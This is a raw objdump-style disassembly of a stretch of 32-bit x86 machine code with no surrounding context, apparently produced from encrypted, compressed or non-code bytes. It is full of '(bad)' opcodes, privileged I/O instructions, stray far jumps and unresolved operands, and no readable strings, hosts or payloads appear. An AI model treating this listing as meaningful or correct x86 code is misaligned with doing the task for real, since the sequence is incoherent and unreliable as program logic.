  4031a5:	out    dx,eax
  4031a6:	aam    0xa0
  4031a8:	shr    DWORD PTR [eax+0x64f48bf3],cl
  4031ae:	pop    ebp
  4031af:	sbb    bl,cl
  4031b1:	cli    
  4031b2:	imul   ebp,edx,0xffffffb5
  4031b5:	ss nop
  4031b7:	push   ebp
  4031b8:	pushf  
  4031b9:	push   esi
  4031ba:	mov    ebp,0xf29b9074
  4031bf:	push   0x2d9d6c43
  4031c4:	leave  
  4031c5:	std    
  4031c6:	sbb    al,0xd7
  4031c8:	push   esi
  4031c9:	out    0x38,al
  4031cb:	push   es
  4031cc:	xchg   DWORD PTR [edx+edi*2-0x537f09d6],ecx
  4031d3:	les    esi,FWORD PTR [edx]
  4031d5:	and    ecx,DWORD PTR [edi]
  4031d7:	pop    edi
  4031d8:	out    dx,al
  4031d9:	inc    eax
  4031da:	mov    ds:0xfbb2eba9,al
  4031df:	add    BYTE PTR [esi+0x5cfb1e0],0x78
  4031e6:	mov    ds:0x924fffc7,eax
  4031eb:	push   0x3133a1da
  4031f0:	adc    DWORD PTR [ebx-0x7c],esp
  4031f3:	xor    DWORD PTR [edi],esp
  4031f5:	fbstp  TBYTE PTR [edx-0x73]
  4031f8:	pop    ecx
  4031f9:	xor    DWORD PTR [ebp-0x1],esp
  4031fc:	mov    eax,ds:0x3d9e190b
  403201:	das    
  403202:	je     0x403205
  403204:	dec    ebp
  403206:	inc    edx
  403208:	shl    edi,0xee
  40320b:	cli    
  40320c:	gs ret 
  40320e:	or     ah,cl
  403210:	mov    edi,0xe2a4730f
  403215:	test   eax,0x8d615eb6
  40321a:	int    0x77
  40321c:	xchg   ebx,eax
  40321d:	lds    ebp,FWORD PTR [ebp+0x2f]
  403220:	outs   dx,BYTE PTR ds:[esi]
  403221:	or     BYTE PTR [ebp+0x2b],0x88
  403225:	add    ebx,esp
  403227:	jl     0x4032a6
  403229:	jp     0x403269
  40322b:	push   edx
  40322c:	jl     0x4031c2
  40322e:	mov    al,ds:0x1257fbf7
  403233:	mov    edi,0x4a3a233c
  403238:	pop    ecx
  403239:	add    eax,0x6ff47f59
  40323e:	scas   al,BYTE PTR es:[edi]
  40323f:	lods   eax,DWORD PTR ds:[esi]
  403240:	adc    eax,0x4ff04434
  403245:	arpl   WORD PTR [ebp-0x5f],cx
  403248:	mov    esi,0x2fe6b85c
  40324d:	cmp    eax,0x92db68a4
  403252:	fcomp  DWORD PTR [eax+0x7cfaf99b]
  403258:	pushf  
  403259:	mov    eax,ds:0xd27d4ffd
  40325e:	and    DWORD PTR [eax+0x71],esi
  403261:	neg    ecx
  403263:	(bad)  
  403264:	xor    eax,0x3e9e04f0
  403269:	gs jnp 0x4032dd
  40326c:	sar    BYTE PTR [ecx+0x4e],0xb0
  403270:	sbb    al,0xe8
  403272:	or     eax,0x2e2e7713
  403277:	iret   
  403278:	addr16 popf 
  40327a:	(bad)  
  40327b:	mov    ds:0xe6f278d7,al
  403280:	scas   al,BYTE PTR es:[edi]
  403281:	icebp  
  403282:	and    eax,0x8edfc874
  403287:	mov    ds:0xa4ba3b78,al
  40328c:	pop    esp
  40328e:	jnp    0x403303
  403290:	fnsave [ecx-0x64]
  403293:	inc    ecx
  403294:	cs hlt 
  403296:	(bad)  
  403297:	mov    dh,0xe1
  403299:	push   ebp
  40329a:	ret    0xaa04
  40329d:	pop    ds
  40329e:	mov    bh,0x36
  4032a0:	push   ecx
  4032a1:	(bad)  
  4032a2:	in     eax,0x8a
  4032a4:	or     eax,0x2ec0d722
  4032a9:	pop    es
  4032aa:	push   edx
  4032ab:	mov    DWORD PTR [esi],edi
  4032ad:	nop
  4032ae:	add    cl,BYTE PTR [ebx-0x6e]
  4032b1:	aaa    
  4032b2:	pop    ss
  4032b3:	std    
  4032b4:	pop    es
  4032b5:	in     eax,dx
  4032b6:	mov    ecx,0x60695f2d
  4032bb:	adc    al,0xf5
  4032bd:	add    cl,ch
  4032bf:	add    BYTE PTR [ebx-0x1d],0xd0
  4032c3:	xchg   edx,eax
  4032c4:	out    0xf3,eax
  4032c6:	jae    0x403323
  4032c8:	xchg   esi,eax
  4032c9:	add    BYTE PTR ds:0x247905d5,dh
  4032cf:	mov    ?,esi
  4032d1:	into   
  4032d2:	clc    
  4032d3:	loope  0x40330d
  4032d5:	scas   al,BYTE PTR es:[edi]
  4032d6:	xor    DWORD PTR [edi+ebp*2],ebp
  4032d9:	mov    ebx,DWORD PTR [ebx-0x4a5053b5]
  4032df:	pop    edi
  4032e0:	fucom  st(0)
  4032e2:	mov    ds:0x1d04c083,al
  4032e7:	jmp    0x403286
  4032e9:	inc    edx
  4032ea:	dec    esi
  4032eb:	jge    0x40330d
  4032ed:	out    0xa0,eax
  4032ef:	lahf   
  4032f0:	sti    
  4032f1:	ins    DWORD PTR es:[edi],dx
  4032f2:	cs (bad) 
  4032f4:	aas    
  4032f5:	cmp    al,0x16
  4032f7:	repnz push ds
  4032f9:	je     0x403298
  4032fb:	sbb    BYTE PTR [esi],bl
  4032fd:	jb     0x4032fe
  4032ff:	or     DWORD PTR [esi+eax*2-0x57],ecx
  403303:	jnp    0x4032b0
  403305:	adc    ah,al
  403307:	lds    ebp,FWORD PTR [edi]
  403309:	cmp    dl,BYTE PTR [edx+0x46]
  40330c:	sti    
  40330d:	push   0xf6c09386
  403312:	mov    esp,edx
  403314:	sbb    edi,eax
  403316:	retf   
  403317:	data16 sub BYTE PTR [edx+0x4a],cl
  40331b:	sub    DWORD PTR [esi-0xe],0xfab0444f
  403322:	mov    cl,al
  403324:	add    bh,dh
  403326:	stc    
  403327:	push   cs
  403328:	sbb    DWORD PTR [ebx-0x5c],ecx
  40332b:	cmp    al,0x86
  40332d:	jo     0x4032cc
  40332f:	and    bl,BYTE PTR [ecx+0x6f]
  403332:	retf   
  403333:	adc    eax,0x55157d2f
  403338:	push   DWORD PTR [ecx+esi*2]
  40333b:	and    DWORD PTR [ecx+0x1],ebp
  40333e:	dec    eax
  40333f:	clc    
  403340:	xor    al,0xf9
  403342:	xchg   esi,eax
  403343:	xor    bh,BYTE PTR [edx]
  403345:	and    eax,0xd0cda4f3
  40334a:	(bad)  
  40334b:	push   ss
  40334c:	mov    ch,0xba
  40334e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40334f:	xor    DWORD PTR [ebp-0xc70b4cc],edx
  403355:	or     eax,0xf2c7bfe1
  40335a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40335b:	mov    ah,cl
  40335d:	jmp    0xa95027fd
  403362:	xor    bl,BYTE PTR [eax+0x6d3488dd]
  403368:	push   0xffffffbe
  40336a:	test   BYTE PTR [ecx-0x58],ah
  40336d:	or     edx,DWORD PTR [edx-0x5d]
  403370:	leave  
  403371:	(bad)  
  403372:	ins    BYTE PTR es:[edi],dx
  403373:	xor    edi,DWORD PTR [edx]
  403375:	dec    esp
  403376:	mov    esp,0x50ce71b1
  40337b:	mov    ah,0x26
  40337d:	xchg   BYTE PTR [eax+0x74],dh
  403380:	or     al,0x27
  403382:	pop    ds
  403383:	pop    edx
  403384:	leave  
  403385:	cli    
  403386:	gs nop
  403388:	push   esp
  403389:	test   ch,dh
  40338b:	out    dx,eax
  40338c:	jns    0x403338
  40338e:	or     edx,DWORD PTR [esp+esi*1-0x1c0e36c5]
  403395:	das    
  403396:	jmp    0x403416
  403398:	leave  
  403399:	cwde   
  40339a:	xchg   edi,eax
  40339b:	nop
  40339c:	adc    esp,0x0
  40339f:	jge    0x40341f
  4033a1:	mov    dl,0xa9
  4033a3:	les    ecx,FWORD PTR ds:0x95512a87
  4033a9:	mov    al,ds:0x5f31a17d
  4033ae:	repnz push es
  4033b0:	fst    st(5)
  4033b2:	and    BYTE PTR [esi],0x2c
  4033b5:	xor    esp,ecx
  4033b7:	add    eax,0x7e6264fa
  4033bc:	xchg   ebp,eax
  4033bd:	mov    ch,BYTE PTR [esi]
  4033bf:	out    dx,al
  4033c0:	xchg   ebx,eax
  4033c1:	ret    0x3190
  4033c4:	fwait
  4033c5:	or     eax,DWORD PTR [ebp-0x6ee33471]
  4033cb:	push   ebx
  4033cc:	xor    BYTE PTR [ecx+ebx*8+0x19],bh
  4033d0:	push   cs
  4033d1:	dec    DWORD PTR [ecx-0x23a2f713]
  4033d7:	in     eax,dx
  4033d8:	(bad)  
  4033d9:	sti    
  4033da:	inc    eax
  4033db:	dec    esp
  4033dc:	xchg   esp,eax
  4033dd:	repz iret 
  4033df:	jno    0x403397
  4033e1:	ds jae 0x40338a
  4033e4:	cmp    BYTE PTR [edx+0x5d4138f0],0x9
  4033eb:	fadd   DWORD PTR [eax-0x536b693]
  4033f1:	pop    esp
  4033f2:	imul   esp,DWORD PTR [edi],0xb95583e3
  4033f8:	sbb    eax,0x2e67890c
  4033fd:	(bad)  
  4033fe:	outs   dx,DWORD PTR ds:[esi]
  4033ff:	sub    ch,bh
  403401:	inc    ebp
  403402:	or     DWORD PTR [edi-0x42],esi
  403405:	aas    
  403406:	mov    ds:0x3b194823,al
  40340b:	int3   
  40340c:	daa    
  40340d:	outs   dx,BYTE PTR ds:[esi]
  40340e:	push   ebp
  40340f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403410:	fcom   DWORD PTR [eax+eiz*2]
  403413:	popa   
  403414:	shr    ecx,0xae
  403417:	aas    
  403418:	ret    0xd0ab
  40341b:	jp     0x403455
  40341d:	inc    DWORD PTR [ecx+edi*8]
  403420:	pop    eax
  403421:	fstp   DWORD PTR [edi]
  403423:	adc    al,0x20
  403425:	jnp    0x40342b
  403427:	das    
  403428:	mov    ds,eax
  40342a:	retf   0x4185
  40342d:	inc    ecx
  40342e:	sub    DWORD PTR [ebx-0x15],ebp
  403431:	ins    DWORD PTR es:[edi],dx
  403432:	mov    bh,0x77
  403434:	ror    DWORD PTR [ecx],cl
  403436:	ja     0x403453
  403438:	imul   ebp,DWORD PTR [esi+ebx*2],0x7cb1e5be
  40343f:	inc    edx
  403440:	loopne 0x403473
  403442:	pop    ebp
  403443:	xor    BYTE PTR [esi+0x5ebbede2],al
  403449:	scas   eax,DWORD PTR es:[edi]
  40344a:	call   0xc9bc:0xe87f83d0
  403451:	sbb    BYTE PTR [ebx+0x35c774b1],dh
  403457:	or     eax,0xa647a27d
  40345c:	cmp    DWORD PTR [edx+ebp*4+0x238a4be],edi
  403463:	push   edi
  403464:	cmp    DWORD PTR [ecx-0x15c8cf99],ecx
  40346a:	pop    edx
  40346b:	test   DWORD PTR [edx-0x7e],esp
  40346e:	adc    al,0xcf
  403470:	int    0x1e
  403472:	(bad)  
  403473:	aad    0x35
  403475:	mov    eax,0x4e74fbdf
  40347a:	pop    edi
  40347b:	pop    ecx
  40347c:	daa    
  40347d:	out    0x2,eax
  40347f:	mov    al,0xbc
  403481:	push   es
  403482:	(bad)  
  403483:	cmp    eax,ebx
  403485:	jl     0x403504
  403487:	mov    al,BYTE PTR [esi]
  403489:	icebp  
  40348a:	cmp    dl,BYTE PTR [ecx-0x5f3155f7]
  403490:	lds    edi,FWORD PTR [edi+0x48]
  403493:	imul   esp,DWORD PTR [ecx+edi*1-0x7452dc0f],0xf1d0ffe7
  40349e:	in     al,dx
  40349f:	dec    edi
  4034a0:	xchg   ebp,eax
  4034a1:	nop
  4034a2:	jge    0x403462
  4034a4:	push   es
  4034a5:	lods   eax,DWORD PTR ds:[esi]
  4034a6:	adc    al,al
  4034a8:	push   eax
  4034a9:	imul   edi,ebp,0x3310a48f
  4034af:	dec    edx
  4034b0:	rol    DWORD PTR [eax+eiz*2+0x478f87e5],cl
  4034b7:	ins    BYTE PTR es:[edi],dx
  4034b8:	mov    dl,0x67
  4034ba:	sub    BYTE PTR [eax-0x29],ah
  4034bd:	mov    eax,ds:0xab80e73b
  4034c2:	sbb    ah,dl
  4034c4:	and    al,0xb8
  4034c6:	sbb    DWORD PTR [ebp-0x4dbfc048],ebp
  4034cc:	ja     0x403539
  4034ce:	add    BYTE PTR [ecx+0x66],ch
  4034d1:	loope  0x40349a
  4034d3:	aad    0x6c
  4034d5:	inc    eax
  4034d6:	ret    0xbc2f
  4034d9:	mov    esi,0x5059bcea
  4034de:	jmp    0x40351b
  4034e0:	push   eax
  4034e1:	and    DWORD PTR [edx+0x2e],edx
  4034e4:	cmp    al,0x50
  4034e6:	lock push 0x184fbf5e
  4034ec:	sar    BYTE PTR [edx+0x249ba8d6],0xe8
  4034f3:	cli    
  4034f4:	test   DWORD PTR [edx],ebx
  4034f6:	and    edx,DWORD PTR [ebx]
  4034f8:	cld    
  4034f9:	xor    al,0xb4
  4034fb:	out    0x76,al
  4034fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034fe:	(bad)  
  4034ff:	dec    ebp
  403500:	hlt    
  403501:	rol    DWORD PTR [ebx],0xd6
  403504:	fisubr WORD PTR [ebx]
  403506:	pop    edx
  403507:	pop    esp
  403508:	xchg   ecx,eax
  403509:	pop    edx
  40350a:	shr    edi,0xe0
  40350d:	add    eax,0x557f7a91
  403512:	out    0xa2,al
  403514:	test   BYTE PTR [ebp-0x6eb92bbf],bl
  40351a:	xor    ebp,DWORD PTR [edx-0x391f980e]
  403520:	imul   esi,esi,0x76
  403523:	mov    ?,WORD PTR [esp+ecx*1-0x235e78ca]
  40352a:	mov    edx,0xedd88b75
  40352f:	pop    esi
  403530:	push   0xffffffa3
  403532:	outs   dx,BYTE PTR ds:[esi]
  403533:	xor    BYTE PTR [esi-0x608b37ca],bl
  403539:	dec    esi
  40353a:	clc    
  40353b:	sub    al,0x19
  40353d:	jle    0x40353a
  40353f:	mov    ah,0x5f
  403541:	xor    edi,esi
  403543:	xchg   DWORD PTR [edx],edx
  403545:	mov    al,ds:0x42105a1e
  40354a:	add    BYTE PTR [ecx],cl
  40354c:	sahf   
  40354d:	jmp    0x4034e6
  40354f:	push   0x96e283a
  403554:	(bad)  
  403555:	xchg   esp,eax
  403556:	sbb    ebp,DWORD PTR [esi]
  403558:	jp     0x403523
  40355a:	enter  0xbf79,0x9c
  40355e:	dec    eax
  40355f:	and    eax,0x998c8ea
  403564:	jns    0x403519
  403566:	mov    edx,0x2f5c59ce
  40356b:	sub    esp,DWORD PTR [eax]
  40356d:	fbld   TBYTE PTR [edi-0x6f474278]
  403573:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  403575:	(bad)  
  403576:	fist   DWORD PTR [eax+0x29]
  403579:	cmp    esi,DWORD PTR [edx]
  40357b:	pop    edx
  40357c:	jecxz  0x403546
  40357e:	jmp    0x40355d
  403580:	frstor [ebx]
  403582:	ins    BYTE PTR es:[edi],dx
  403583:	neg    BYTE PTR [esi+0x56b59150]
  403589:	add    ecx,edx
  40358b:	mov    WORD PTR [edi-0x58059790],es
  403591:	les    esp,FWORD PTR [edi-0x4d]
  403594:	inc    edx
  403595:	xor    ebp,DWORD PTR [ecx-0x10]
  403598:	retf   
  403599:	sub    al,0x34
  40359b:	jmp    0x3f85:0xd60b7d85
  4035a2:	add    dl,BYTE PTR [eax+edi*1-0x24a2b410]
  4035a9:	sti    
  4035aa:	sti    
  4035ab:	cmp    BYTE PTR ss:[eax+0x17055647],0xbb
  4035b3:	mov    eax,0x970048ec
  4035b8:	mov    eax,ds:0x3c99b768
  4035bd:	jmp    0xf775321b
  4035c2:	scas   al,BYTE PTR es:[edi]
  4035c3:	xchg   esp,esp
  4035c5:	dec    ecx
  4035c6:	int3   
  4035c7:	out    dx,al
  4035c8:	xchg   ebp,eax
  4035c9:	xchg   edx,eax
  4035ca:	ds aas 
  4035cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035cd:	xchg   esi,eax
  4035ce:	inc    ecx
  4035cf:	ret    0x60f7
  4035d2:	lds    eax,FWORD PTR [ebp+0x45]
  4035d5:	adc    dl,0x1d
  4035d8:	idiv   DWORD PTR [edx]
  4035da:	xchg   ecx,eax
  4035db:	add    ecx,DWORD PTR [esi+0x23]
  4035de:	sbb    BYTE PTR [esi],dl
  4035e0:	mov    edx,0xd83c98ba
  4035e5:	cmp    ebx,DWORD PTR [eax]
  4035e7:	pop    ss
  4035e8:	adc    al,0x56
  4035ea:	in     al,dx
  4035eb:	mov    bh,BYTE PTR [ebx-0x77]
  4035ee:	std    
  4035ef:	(bad)  
  4035f0:	dec    esi
  4035f1:	repz jmp 0x88fd38d3
  4035f7:	or     eax,0xb3f4b2c6
  4035fc:	add    ebp,DWORD PTR [ebp-0x46]
  4035ff:	mov    DWORD PTR [edi],ebp
  403601:	push   eax
  403602:	xor    BYTE PTR [ebx+edx*2],0xbb
  403606:	js     0x40365b
  403608:	mov    al,BYTE PTR [eax-0x1263f126]
  40360e:	sar    DWORD PTR [ebx-0x5c],cl
  403611:	inc    esi
  403612:	fimul  DWORD PTR [ebx]
  403614:	(bad)  
  403615:	adc    BYTE PTR [ebp+0x63],0x80
  403619:	dec    edi
  40361a:	mov    edi,ebp
  40361c:	mov    edi,0x2d0db0c8
  403621:	call   0x6d7e:0xb8bc2fe2
  403628:	xchg   edx,eax
  403629:	sbb    al,0x44
  40362b:	rcl    eax,cl
  40362d:	test   al,0xad
  40362f:	ficomp DWORD PTR [ebp-0xaf152c4]
  403635:	scas   eax,DWORD PTR es:[edi]
  403636:	jecxz  0x4035cc
  403638:	lahf   
  403639:	mov    dl,0xa9
  40363b:	cmp    cl,BYTE PTR [ecx+edi*8]
  40363e:	and    eax,0x52681223
  403643:	in     eax,dx
  403644:	and    al,0x23
  403646:	mov    BYTE PTR [edx],ch
  403648:	mov    ch,0x4f
  40364a:	sar    BYTE PTR [ebp+0x77],0x78
  40364e:	or     eax,DWORD PTR [ebx-0x15d1815e]
  403654:	inc    esp
  403655:	fnstcw WORD PTR [ebx+0x4666ae1c]
  40365b:	es loopne 0x40360b
  40365e:	fistp  QWORD PTR [eax-0x1afda8ff]
  403664:	and    sp,WORD PTR [eax-0x79]
  403668:	xchg   DWORD PTR [edi-0x509763c2],esi
  40366e:	adc    esi,ecx
  403670:	and    ch,BYTE PTR [ebx]
  403672:	jg     0x4036de
  403674:	test   al,0x4c
  403676:	dec    ebx
  403677:	and    dl,BYTE PTR [edx]
  403679:	add    BYTE PTR ds:0xb135dca7,cl
  40367f:	add    al,0xf6
  403681:	dec    esi
  403682:	sub    ecx,DWORD PTR [edx-0x5612bf38]
  403688:	(bad)  
  403689:	xor    edx,edi
  40368b:	fnsave [ebx+0x59]
  40368e:	test   al,0x26
  403690:	addr16 (bad) 
  403692:	xor    al,0x30
  403694:	mov    cl,BYTE PTR [edi-0x67f552aa]
  40369a:	add    esi,edx
  40369c:	mov    ecx,0xf944ad3a
  4036a1:	iret   
  4036a2:	sti    
  4036a3:	or     DWORD PTR [ebx+0xc],esi
  4036a6:	(bad)  
  4036a7:	sbb    eax,0x5e1f0c45
  4036ac:	cmp    eax,0x83c70f81
  4036b1:	shrd   DWORD PTR [edx-0x4cb301ae],esi,0x76
  4036b9:	push   ds
  4036ba:	add    DWORD PTR [edx+0x6bc15f0],0x983bddf0
  4036c4:	sub    cl,al
  4036c6:	stos   DWORD PTR es:[edi],eax
  4036c7:	mov    eax,0x2d6f54b7
  4036cc:	cmp    DWORD PTR [eax-0x77],edx
  4036cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036d0:	xor    edx,esp
  4036d2:	xor    cl,bh
  4036d4:	push   es
  4036d5:	pop    edx
  4036d6:	jbe    0x4036f2
  4036d8:	add    bh,BYTE PTR [ebx-0x2b]
  4036db:	and    al,0xe8
  4036dd:	pusha  
  4036de:	pushf  
  4036df:	sbb    cl,dl
  4036e1:	xchg   esi,eax
  4036e2:	cld    
  4036e3:	loop   0x4036b6
  4036e5:	bound  ecx,QWORD PTR [ecx]
  4036e7:	stc    
  4036e8:	push   eax
  4036e9:	(bad)  
  4036ea:	dec    eax
  4036eb:	xacquire xchg DWORD PTR [ecx-0x28cef814],esp
  4036f2:	xor    BYTE PTR [edi],bh
  4036f4:	mov    al,ds:0xdfb90917
  4036f9:	sbb    BYTE PTR [esi+0x4d552d45],dh
  4036ff:	jge    0x40370d
  403701:	sub    ebp,DWORD PTR [eax]
  403703:	(bad)  
  403704:	iretw  
  403706:	dec    edx
  403707:	test   DWORD PTR ss:[edi],edx
  40370a:	xor    edi,DWORD PTR [ebp-0x7d]
  40370d:	inc    ecx
  40370e:	mov    fs,WORD PTR [ebp-0x6be67330]
  403714:	adc    DWORD PTR [esi-0x61748c83],esi
  40371a:	sar    DWORD PTR [esi-0x6236266e],cl
  403720:	add    DWORD PTR [ebx+ecx*1-0x6d],esi
  403724:	cmc    
  403725:	cdq    
  403726:	cwde   
  403727:	bound  eax,QWORD PTR [ebx-0x1e77fff6]
  40372d:	jno    0x403741
  40372f:	hlt    
  403730:	sub    al,0x6d
  403732:	inc    edx
  403733:	mov    dl,0x10
  403735:	sub    BYTE PTR [ebp+0x748c5448],al
  40373b:	ret    
  40373c:	jle    0x403784
  40373e:	dec    ecx
  40373f:	push   ecx
  403740:	push   ebp
  403741:	fcmovnu st,st(5)
  403743:	loop   0x403717
  403745:	sub    al,0xff
  403747:	push   esp
  403748:	scas   ax,WORD PTR es:[edi]
  40374a:	data16 jge 0x403775
  40374d:	cmc    
  40374e:	pop    ecx
  40374f:	repnz aam 0x7e
  403752:	mov    edx,0x5834ab42
  403757:	dec    esp
  403758:	dec    ecx
  403759:	cdq    
  40375a:	(bad)  
  40375b:	loopne 0x4037cc
  40375d:	popf   
  40375e:	mov    esp,0x11a2939d
  403763:	pop    ebx
  403764:	arpl   WORD PTR [eax+0x3a7e323a],sp
  40376a:	call   0xfcc12f5c
  40376f:	xchg   ebp,eax
  403770:	jecxz  0x40378e
  403772:	stos   BYTE PTR es:[edi],al
  403773:	and    BYTE PTR [ebp+0x39],0xbc
  403777:	pop    ds
  403778:	sub    ch,cl
  40377a:	dec    edx
  40377b:	inc    esi
  40377c:	xchg   edx,eax
  40377d:	cmp    al,BYTE PTR [ebx+0xb5fb74e]
  403783:	lods   eax,DWORD PTR ds:[esi]
  403784:	or     ch,BYTE PTR [esi]
  403786:	imul   edx,DWORD PTR es:[edx],0x4f
  40378a:	icebp  
  40378b:	xor    esi,DWORD PTR [edx-0x7a75db2e]
  403791:	bound  ebx,QWORD PTR [ebx]
  403793:	pop    eax
  403794:	test   bl,al
  403796:	dec    edi
  403797:	lahf   
  403798:	jne    0x4037f0
  40379a:	mov    bl,bh
  40379c:	cmp    esp,DWORD PTR [edi-0x23c376f8]
  4037a2:	inc    ecx
  4037a3:	aaa    
  4037a4:	bound  ecx,QWORD PTR [ebx-0x589c3cde]
  4037aa:	add    al,0xd6
  4037ac:	pop    esi
  4037ad:	pop    esi
  4037ae:	mov    edi,0xcaa5ec5b
  4037b3:	mov    ds:0x7d94996b,al
  4037b8:	daa    
  4037b9:	mov    dl,0x4c
  4037bb:	xchg   BYTE PTR [ebx+0x242cef9b],ch
  4037c1:	push   edi
  4037c2:	push   cs
  4037c3:	arpl   WORD PTR [ebx-0x4b],sp
  4037c6:	lock sbb dh,BYTE PTR [ebx+0x2a]
  4037ca:	pop    eax
  4037cb:	aas    
  4037cc:	inc    esi
  4037cd:	test   al,0xcc
  4037cf:	mov    al,ds:0x71375c90
  4037d4:	int3   
  4037d5:	push   edx
  4037d6:	sti    
  4037d7:	popf   
  4037d8:	aad    0x53
  4037da:	ficom  DWORD PTR [esi+edi*4]
  4037dd:	inc    edi
  4037de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037df:	or     eax,0x64f62a3a
  4037e4:	adc    esp,DWORD PTR [ebp-0x767e542e]
  4037ea:	rol    DWORD PTR [esi+0x37],1
  4037ed:	cdq    
  4037ee:	aaa    
  4037ef:	mov    ebp,0xf0530965
  4037f4:	cmp    BYTE PTR [ebp-0x219163ab],ch
  4037fa:	adc    DWORD PTR [edi+0x6],edx
  4037fd:	loop   0x4037c7
  4037ff:	lds    ebp,FWORD PTR [edi+0x63e4b76d]
  403805:	sub    dh,bh
  403807:	sti    
  403808:	push   ss
  403809:	test   BYTE PTR [esi+0x2d],0x1a
  40380d:	sbb    bh,bl
  40380f:	shr    DWORD PTR [ecx],1
  403811:	mov    eax,0xec2f6651
  403816:	dec    esi
  403817:	repz mov eax,0xca6e0552
  40381d:	int    0x7b
  40381f:	mov    esi,0x9a559437
  403824:	pop    es
  403825:	sbb    eax,0x418e6a8f
  40382a:	push   ebx
  40382b:	ins    DWORD PTR es:[di],dx
  40382d:	ja     0x4037fb
  40382f:	shr    ebx,1
  403831:	add    BYTE PTR [ecx+0x3b51c766],0xe1
  403838:	dec    eax
  403839:	jnp    0x4037ef
  40383b:	sbb    edx,eax
  40383d:	or     BYTE PTR [eax+0x4e],0xef
  403841:	rcl    DWORD PTR [ebx+0x36137365],cl
  403847:	repnz inc esi
  403849:	adc    al,0x5e
  40384b:	inc    ebp
  40384c:	fcmove st,st(2)
  40384e:	xor    cl,BYTE PTR [ebx]
  403850:	cmp    BYTE PTR [eax],bl
  403852:	(bad)  
  403853:	inc    esi
  403854:	or     ch,BYTE PTR [ebx]
  403856:	cmp    DWORD PTR [edx],0x487dc35e
  40385c:	xchg   esi,eax
  40385d:	pop    es
  40385e:	add    ebp,esp
  403860:	pop    edx
  403861:	std    
  403862:	sbb    cl,cl
  403864:	mov    bh,0x98
  403866:	mov    esi,0xa74d686e
  40386b:	add    BYTE PTR [esi+eiz*1],dh
  40386e:	in     al,dx
  40386f:	nop
  403870:	xchg   edi,eax
  403871:	lods   eax,DWORD PTR ds:[esi]
  403872:	jb     0x40380a
  403874:	jns    0x40383e
  403876:	out    0xd9,al
  403878:	je     0x403816
  40387a:	outs   dx,DWORD PTR ds:[esi]
  40387b:	int    0x31
  40387d:	fs js  0x40387e
  403880:	mov    dl,0x29
  403882:	rcl    BYTE PTR [edx],1
  403884:	ret    0xd761
  403887:	xor    DWORD PTR [esi],edx
  403889:	or     al,0x25
  40388b:	gs mov ch,0x3d
  40388e:	mov    ecx,0x254ba628
  403893:	dec    edi
  403894:	imul   edi,DWORD PTR [esi],0x994e18e4
  40389a:	ss inc edi
  40389c:	jns    0x403878
  40389e:	mov    edx,0x8de39925
  4038a3:	pusha  
  4038a4:	fistp  QWORD PTR [eax+0x20]
  4038a7:	push   DWORD PTR [eax-0x59]
  4038aa:	mov    dl,0x8a
  4038ac:	xchg   esp,eax
  4038ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038ae:	fs mov bl,0x9b
  4038b1:	mov    ah,0x1e
  4038b3:	jp     0x40383f
  4038b5:	jmp    0x5e3a:0xf6d14c8
  4038bc:	clc    
  4038bd:	mov    WORD PTR [esi-0x26],cs
  4038c0:	sbb    ebx,ebx
  4038c2:	cmp    ebp,DWORD PTR [esi-0x34ff3c5f]
  4038c8:	retf   0xba67
  4038cb:	push   ss
  4038cc:	mov    ah,0x14
  4038ce:	or     DWORD PTR [edx+0x4],edx
  4038d1:	adc    ebp,ecx
  4038d3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4038d5:	sub    eax,0x6e1bffab
  4038da:	cmp    ebp,DWORD PTR [edx-0x77b437c0]
  4038e0:	push   ebx
  4038e1:	inc    edx
  4038e2:	push   eax
  4038e3:	scas   al,BYTE PTR es:[edi]
  4038e4:	jle    0x403935
  4038e6:	lods   al,BYTE PTR ds:[esi]
  4038e7:	cmp    eax,0x1f5d33ae
  4038ec:	pop    es
  4038ed:	sahf   
  4038ee:	repnz and edx,esp
  4038f1:	nop
  4038f2:	jae    0x40396f
  4038f4:	gs adc eax,0xae40ccfd
  4038fa:	adc    bh,ch
  4038fc:	in     al,dx
  4038fd:	push   ds
  4038fe:	in     eax,dx
  4038ff:	or     eax,DWORD PTR [ebx-0x46be6b6d]
  403905:	sbb    eax,0x3a6db7c6
  40390a:	xor    eax,0x59ad231e
  40390f:	sbb    BYTE PTR [eax-0x7a9cd0f8],0xf
  403916:	call   0x9da4edd3
  40391b:	int    0x47
  40391d:	sub    BYTE PTR [esi],dh
  40391f:	aaa    
  403920:	xor    edx,DWORD PTR [eax]
  403922:	push   edx
  403923:	cmp    eax,0x55b7b5c9
  403928:	es js  0x40393f
  40392b:	lods   al,BYTE PTR ds:[esi]
  40392c:	jp     0x40390c
  40392e:	sub    DWORD PTR [ebx],0x9ebfa5be
  403934:	test   DWORD PTR [ebx-0x57],esp
  403937:	neg    cl
  403939:	mov    dh,0xa4
  40393b:	xchg   ecx,eax
  40393c:	or     BYTE PTR es:[esi-0x78dcff1e],dh
  403943:	mov    ebp,DWORD PTR [ebx-0x43a681eb]
  403949:	jb     0x4039ab
  40394b:	mov    edx,0xf73559bc
  403950:	es (bad) 
  403952:	rol    esp,1
  403954:	adc    DWORD PTR [edx-0x395de775],eax
  40395a:	scas   al,BYTE PTR es:[edi]
  40395b:	lods   al,BYTE PTR ds:[esi]
  40395c:	retf   0xebdb
  40395f:	stos   BYTE PTR es:[edi],al
  403960:	test   BYTE PTR [edi+0x24db8e44],bl
  403966:	in     al,dx
  403967:	cs ret 0xfb70
  40396b:	sub    bh,cl
  40396d:	adc    eax,0x40af7b0c
  403972:	mov    WORD PTR [edx+edi*4-0x78],?
  403976:	xor    dh,cl
  403978:	cmp    al,0x98
  40397a:	(bad)  
  40397b:	pushf  
  40397c:	cs jl  0x4039e1
  40397f:	(bad)  
  403980:	mov    edx,0xc7bca7df
  403985:	mov    eax,ds:0x2316dd90
  40398a:	mov    DWORD PTR [edx+0x30705f88],edi
  403990:	pop    ds
  403991:	nop
  403992:	or     DWORD PTR [eax-0x21],0xffffffb5
  403996:	iret   
  403997:	outs   dx,BYTE PTR ds:[esi]
  403998:	rcr    BYTE PTR [ecx+ebx*1],cl
